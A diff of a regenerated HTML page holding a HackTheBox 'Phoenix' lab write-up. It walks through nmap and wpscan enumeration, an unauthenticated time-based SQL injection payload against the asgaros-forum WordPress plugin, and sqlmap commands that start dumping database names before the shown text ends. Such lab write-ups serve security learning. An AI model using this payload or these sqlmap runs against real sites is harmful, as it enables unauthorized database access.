@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.769393205067">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.819170984352">
 
     <!-- See retype.com -->
-    <meta name="generator" content="Retype 3.5.0">
+    <meta name="generator" content="Retype 3.11.0">
 
     <!-- Primary Meta Tags -->
     <title>Phoenix</title>
@@ -30,52 +30,52 @@
     <meta property="twitter:description" content="IP: 10.10.11.149">
     <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/phoenix/images/phoenix.png">
 
-    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=3.5.0.769393205067" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=3.11.0.819170984352" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.5.0.769393205067" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.5.0.769393205067" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.819170984352" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.819170984352" defer></script>
 </head>
 <body>
-    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
-        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
     
-        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
             <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                 <!-- Mobile menu button skeleton -->
-                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
-                <div v-cloak id="docs-sidebar-toggle"></div>
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
         
                 <!-- Logo -->
                 <div class="flex items-center justify-between h-full py-2 md:w-75">
                     <div class="flex items-center px-2 md:px-6">
-                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
-                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
-                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">ctf-notes</span>
                     </div>
         
-                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
                 </div>
         
                 <div class="flex justify-between md:grow">
                     <!-- Top Nav -->
-                    <nav class="hidden md:flex">
+                    <nav id="retype-header-nav" class="hidden md:flex">
                         <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
-                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                            <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                         </g>
                                     </svg>
                                     <span>GitHub</span>
                                 </a>
                             </li>
                             <li class="mr-6">
-                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                     <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                         <g fill="currentColor">
                                             <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -96,7 +96,7 @@
                             <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                 <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                             </div>
-                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                         </div>
         
                         <!-- Mobile search button -->
@@ -114,7 +114,7 @@
                     </div>
         
                     <div v-cloak class="flex justify-end grow">
-                        <div id="docs-mobile-search-button"></div>
+                        <div id="retype-mobile-search-button"></div>
                         <doc-search-desktop></doc-search-desktop>
         
                         <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
@@ -124,26 +124,26 @@
             </div>
         </header>
     
-        <div class="container relative flex bg-white">
+    
+        <div id="retype-container" class="container relative flex bg-white">
             <!-- Sidebar Skeleton -->
-            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
             
-                <!-- Render this div, if config.showSidebarFilter is `true` -->
                 <div class="flex items-center h-16 px-6">
-                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
                 </div>
             
                 <div class="pl-6 mt-1 mb-4">
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
-                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                 </div>
             
-                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
-                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                         <span class="text-xs whitespace-nowrap">Powered by</span>
                         <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                     </a>
@@ -153,23 +153,23 @@
             <!-- Sidebar component -->
             <doc-sidebar v-cloak>
                 <template #sidebar-footer>
-                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
             
-                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
                             <nav>
                                 <ul class="flex flex-wrap justify-center items-center">
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/caueb" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
-                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
                                                 </g>
                                             </svg>
                                             <span>GitHub</span>
                                         </a>
                                     </li>
                                     <li class="mr-6">
-                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                             <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                 <g fill="currentColor">
                                                     <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
@@ -183,7 +183,7 @@
                             </nav>
                         </div>
             
-                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                             <span class="text-xs whitespace-nowrap">Powered by</span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                         </a>
@@ -191,14 +191,14 @@
                 </template>
             </doc-sidebar>
     
-            <div class="grow min-w-0 dark:bg-dark-850">
+            <div class="grow min-w-0 bg-body-bg">
                 <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                 <div class="flex">
-                    <div class="min-w-0 p-4 grow md:px-16">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
                         <main class="relative pb-12 lg:pt-2">
-                            <div class="docs-markdown" id="docs-content">
+                            <div class="retype-markdown" id="retype-content">
                                 <!-- Rendered if sidebar right is enabled -->
-                                <div id="docs-sidebar-right-toggle"></div>
+                                <div id="retype-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
 <doc-anchor-target id="phoenix" class="break-words">
     <h1>
@@ -207,7 +207,7 @@
     </h1>
 </doc-anchor-target>
 <p><figure class="content-center">
-    <img src="images/phoenix.png" alt="">
+    <img src="images/phoenix.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
@@ -225,7 +225,7 @@
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.149
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.149
 
 PORT    STATE SERVICE
 22/tcp  open  ssh
@@ -239,7 +239,7 @@ PORT    STATE SERVICE
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p22,80,443 10.10.11.149
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p22,80,443 10.10.11.149
 
 Nmap scan report for phoenix.htb (10.10.11.149)
 Host is up (0.32s latency).                                                  
@@ -269,7 +269,7 @@ PORT    STATE SERVICE  VERSION
 </doc-codeblock></div>
 <p>We can see that port 80 is redirecting to <code v-pre>https://phoenix.htb</code>. Lets add <code v-pre>phoenix.htb</code> dns entry to <code v-pre>/etc/hosts</code>:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">10.10.11.149    phoenix.htb</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">10.10.11.149    phoenix.htb</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="port-443---https">
     <h2>
@@ -279,24 +279,24 @@ PORT    STATE SERVICE  VERSION
 </doc-anchor-target>
 <p>From the nmap scan I can see that it is running Wordpress v5.9. Lets run <code v-pre>wpscan</code> to enumerate some more:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">$ wpscan --url https://phoenix.htb/ --enumerate ap,at,cb,dbe,u --disable-tls-checks</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">$ wpscan --url https://phoenix.htb/ --enumerate ap,at,cb,dbe,u --disable-tls-checks</code></pre>
 </doc-codeblock></div>
 <p>Bad decision! I got IP blocked!
 <figure class="content-center">
-    <img src="images/image1.png" alt="">
+    <img src="images/image1.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Lets manually enumerate the website.
 Looking at the home page source code I could spot some of the plugins metadata. One of them, asgaros-forum, even leak the the version installed:
 <figure class="content-center">
-    <img src="images/image2.png" alt="">
+    <img src="images/image2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
     <figcaption class="caption"></figcaption>
 </figure>
 </p>
 <p>Searched for known vulnerabilities and found an unauthenticated <a href="https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1">SQL injection</a> for this plugin. To exploit is very easy, the syntax looks like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">?subscribe_topic=1%20union%20select%201%20and%20sleep(10)</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">?subscribe_topic=1%20union%20select%201%20and%20sleep(10)</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="asgaros-forum-sql-injection---wp-plugin">
     <h3>
@@ -307,7 +307,7 @@ Looking at the home page source code I could spot some of the plugins metadata. 
 <p>From the main page we can access the forum at <a href="https://phoenix.htb/forum/">https://phoenix.htb/forum/</a>.
 Browsing to &quot;<a href="https://phoenix.htb/forum/members/">Members</a>&quot; tab we get a list of possible users:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">Phoenix - Administrator
+<pre translate="no" class="language-none"><code v-pre class="language-none">Phoenix - Administrator
 Jack Thomson - User
 Jane Logan - User
 john - User
@@ -315,12 +315,12 @@ John Smith - User</code></pre>
 </doc-codeblock></div>
 <p>We can test the SQL injection vulnerability sending the following GET request:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)</code></pre>
+<pre translate="no" class="language-none"><code v-pre class="language-none">https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)</code></pre>
 </doc-codeblock></div>
 <p>And the browser received a response back from the server 10s later, confirming the SQL injection.</p>
 <p>I will use SQLMap to automate the exploitation. First, I intercepted a request to the vulnerable URL with Burp:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">GET /forum/?subscribe_topic=1 HTTP/2
+<pre translate="no" class="language-none"><code v-pre class="language-none">GET /forum/?subscribe_topic=1 HTTP/2
 Host: phoenix.htb
 Cookie: asgarosforum_unique_id=6235797261801; asgarosforum_unread_cleared=1000-01-01%2000%3A00%3A00; asgarosforum_unread_exclude=a%3A1%3A%7Bi%3A1%3Bi%3A1%3B%7D
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
@@ -341,12 +341,12 @@ Te: trailers</code></pre>
     </h4>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T</code></pre>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T</code></pre>
 </doc-codeblock></div>
 <p>I&#x27;m using &quot;--technique T&quot; to use Time-Based techniques as we know it works from the POC.
 SQLMap found the vulnerability:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
+<pre translate="no" class="language-none"><code v-pre class="language-none">sqlmap identified the following injection point(s) with a total of 67 HTTP(s) requests:
 ---
 Parameter: subscribe_topic (GET)
     Type: time-based blind
@@ -358,7 +358,7 @@ Parameter: subscribe_topic (GET)
 <p>We learned that the database is MySQL, we can add <code v-pre>--dbms=mysql</code> to the arguments so it goes faster.
 Lets dump all the database names:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql --dbs
+<pre translate="no" class="language-none"><code v-pre class="language-none">sqlmap -r subscribe.req --batch --risk 3 --level 5 --random-agent --technique T --dbms=mysql --dbs
 
 [15:34:15] [INFO] fetching database names
